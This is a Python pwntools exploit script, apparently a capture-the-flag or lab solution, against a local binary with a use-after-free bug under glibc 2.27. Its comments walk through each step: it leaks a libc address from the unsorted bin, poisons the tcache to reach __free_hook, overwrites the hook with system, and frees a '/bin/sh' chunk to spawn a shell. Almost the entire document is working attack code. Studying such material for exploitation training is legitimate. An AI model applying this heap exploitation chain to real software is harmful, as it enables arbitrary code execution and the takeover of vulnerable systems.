#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
from pwn import *


se      = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb, timeout = 1)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)

def alloc(idx, size):
    sla(">", "1")
    sla("idx:", str(idx))
    sla("size: ", str(size))

def free(idx):
    sla(">", "2")
    sla("idx:", str(idx))

def read(idx, data):
    sla(">", "3")
    sla("idx:", str(idx))
    sa("data:", data)

def write(idx):
    sla(">", "4")
    sla("idx: \n", str(idx))
    s = ru("1. alloc")
    return s

elf = ELF('./uaf')
context(arch = elf.arch ,log_level = 'debug', os = 'linux', terminal = ['tmux', 'splitw', '-hp','62'])
p = process("./uaf")




## [Glibc 2.27 UAF Attack Roadmap]
## 1. Leak libc address from unsorted bin
## 2. Leverage UAF vulnerability to perform tcachebin attack to free_hook
## 3. Modify free_hook to system




## ---------------------- [Step 1] -------------------------- ##
## Prepare heap chunk for attacking
alloc(0, 0x90)
alloc(1, 0x600)
alloc(2, 0x10)

## Size of chunk 1 is 0x600, would be placed into unsorted bin 
## ** chunk_2 is to prevent chunk_1 from being merged into top chunk
free(1)

## Since chunk 1 is in unsorted bin, the first 8 bytes(fd) is the address of unsorted bin
## unsorted_bin --> chunk 1 --> unsorted_bin
leak_addr = u64(write(1) + "\x00\x00")


## Calculate system and free_hook address
system_addr = leak_addr - 0x39c880
free_hook_addr = leak_addr + 0x1c48



## ---------------------- [Step 2] -------------------------- ##
free(0)
## Size of chunk_0 is 0x90, among size of tcachebin
## tcache_bin(0xa0) --> chunk_0


## Edit fd pointer of chunk_0, let it point to free_hook
read(0, p64(free_hook_addr))


## tcache_bin(0x90) --> chunk_0 --> free_hook
## chunk_3 would be overlapped with chunk_0
alloc(3, 0x90)


## tcache_bin(0x90) --> free_hook
## chunk_4 would be overlapped with free_hook
alloc(4, 0x90)





## ---------------------- [Step 3] -------------------------- ##
## Modify free_hook to be system
read(4, p64(system_addr))


## The below operation would be system("/bin/sh")
read(3, "/bin/sh")
free(3)
p.interactive()